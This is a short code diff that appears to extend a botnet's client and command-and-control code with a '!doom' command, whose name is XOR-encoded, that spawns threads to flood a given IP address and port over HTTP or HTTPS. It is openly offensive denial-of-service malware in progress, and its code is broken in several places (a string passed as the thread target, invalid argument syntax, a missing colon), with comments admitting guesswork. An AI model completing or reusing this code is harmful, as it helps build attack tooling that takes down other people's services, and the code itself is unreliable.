@@ -24,16 +24,16 @@ def doom(ip, url, port):
       
 
 #open url command for client. should be added to the handle function
-elif command[0] == xor_dec('add key',key)#encoded word !doom
+elif command[0] == xor_dec('QBcLCQo=',key)#encoded word !doom
   if attack != 0:
     stop = True
     attack = 0
   stop= False
   for _ in range(int(command[3])):
-    p= threading.Thread(target='add target?', args = command[1], command[2], command[3])#1=!volume, 2=ipaddress 3=port 80 or 443?
+    p= threading.Thread(target='HTTP' or 'HTTPS', args = command[1], command[2], command[3])#1=!volume, 2=ipaddress 3=port 80 or 443?
     p.start()
   attack+=1
 
 #add in cnc line 242-256
 
-sock.send('Doom: !doom host port\r\n'.encode())#not sure what \r\n is, just a guess based on other formatting
+sock.send('Doom: !doom host port threads\r\n'.encode())#not sure what \r\n is, just a guess based on other formatting
